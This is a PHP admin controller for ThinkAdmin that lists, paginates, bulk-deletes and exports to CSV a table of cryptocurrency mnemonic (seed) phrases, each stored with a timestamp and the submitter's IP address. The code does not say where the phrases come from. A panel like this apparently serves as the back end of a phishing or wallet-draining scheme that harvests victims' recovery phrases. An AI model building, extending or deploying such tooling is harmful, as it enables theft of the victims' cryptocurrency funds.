<?php

// +----------------------------------------------------------------------
// | Admin Plugin for ThinkAdmin
// +----------------------------------------------------------------------
// | 版权所有 2014~2025 ThinkAdmin [ thinkadmin.top ]
// +----------------------------------------------------------------------
// | 官方网站: https://thinkadmin.top
// +----------------------------------------------------------------------
// | 开源协议 ( https://mit-license.org )
// | 免责声明 ( https://thinkadmin.top/disclaimer )
// +----------------------------------------------------------------------
// | gitee 代码仓库：https://gitee.com/zoujingli/think-plugs-admin
// | github 代码仓库：https://github.com/zoujingli/think-plugs-admin
// +----------------------------------------------------------------------

declare(strict_types=1);

namespace app\admin\controller;

use think\admin\Controller;
use app\admin\model\word as zhujici;

/**
 * 助记词管理
 * @class Login
 * @package app\admin\controller
 */
class Word extends Controller
{
    /**
     * 助记词
     * @return void
     * @throws \think\admin\Exception
     *@auth true
     *@menu true
     *@login true
     */
    public function index()
    {
        // 常规页面加载
        $word = zhujici::limit(5)->order('id', 'asc')->select();
        $this->word = $word;
        $total = zhujici::count();
        $this->assign('total', $total);
        $this->fetch();
    }

    public function getWords()
    {
        // 获取分页参数
        $page = $this->request->param('page', 1);
        $limit = $this->request->param('limit', 5);
        
        // 计算偏移量
        $offset = ($page - 1) * $limit;
        
        // 获取分页数据
        $wordData = zhujici::limit($offset, $limit)->order('id', 'asc')->select()->toArray();
        $total = zhujici::count();
        
        // 返回JSON响应
        return json([
            'code' => 1,
            'data' => $wordData,
            'total' => $total,
            'msg' => '获取成功'
        ]);
    }

    /**
     * 导出Excel (CSV格式)
     * @return void
     * @throws \think\admin\Exception
     * @auth true
     * @menu true
     * @login true
     */
    public function export()
    {
        try {
            // 获取数据
            $wordData = zhujici::select()->order('id', 'asc')->toArray();
            
            // 设置文件名
            $filename = '助记词数据_' . date('Y-m-d_H-i-s') . '.csv';
            
            // 设置响应头
            header('Content-Type: text/csv; charset=UTF-8');
            header('Content-Disposition: attachment; filename="' . $filename . '"');
            header('Cache-Control: max-age=0');
            
            // 添加BOM以支持中文
            echo "\xEF\xBB\xBF";
            
            // 输出CSV头部
            echo "ID,助记词,添加时间,IP\n";
            
            // 输出数据
            foreach ($wordData as $item) {
                $row = [
                    $item['id'],
                    '"' . str_replace('"', '""', $item['word']) . '"', // 处理包含逗号的内容
                    $item['createdat'],
                    $item['ip'] ?: ''
                ];
                echo implode(',', $row) . "\n";
            }
            
        } catch (\Exception $e) {
            $this->error('导出失败：' . $e->getMessage());
        }
    }

    /**
     * 批量删除
     * @return void
     * @throws \think\admin\Exception
     * @auth true
     * @menu true
     * @login true
     */
    public function batchDelete()
    {
        if ($this->request->isPost()) {
            $ids = $this->request->post('ids');
            
            if (empty($ids)) {
                $this->error('请选择要删除的数据');
            }
            
            try {
                // 批量删除
                $result = zhujici::whereIn('id', $ids)->delete();
                
                if ($result) {
                    $this->success('删除成功，共删除 ' . $result . ' 条数据');
                } else {
                    $this->error('删除失败');
                }
            } catch (\Exception $e) {
                $this->error('删除失败：' . $e->getMessage());
            }
        } else {
            $this->error('请求方式错误');
        }
    }

}
